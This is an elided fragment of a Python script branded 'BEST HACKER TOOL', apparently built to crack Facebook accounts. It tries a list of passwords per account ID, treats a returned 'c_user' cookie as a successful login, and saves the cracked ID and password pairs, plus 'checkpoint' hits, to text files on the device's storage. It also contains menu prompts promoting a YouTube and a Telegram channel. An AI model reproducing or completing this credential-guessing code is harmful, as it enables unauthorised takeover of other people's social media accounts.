...
def ud():
    ...
    print(' [1] SUBSCRIBE CHANNEL BEST HACKER')
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://youtube.com/c/BestHacker004200')
...
def FD():
    ...
    print('\x1b[1;33m [1] JOINED TELEGRAM CHANNEL')
...
\033[1;37m================= \33[32;45mBEST\33[0;m =====================
       ...
       \33[37;41m\t WELLCOME TO BEST HACKER TOOL\33[0;m
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/B-H-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m(B-H-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/B-H-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r     %s[BEST-HACKER] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
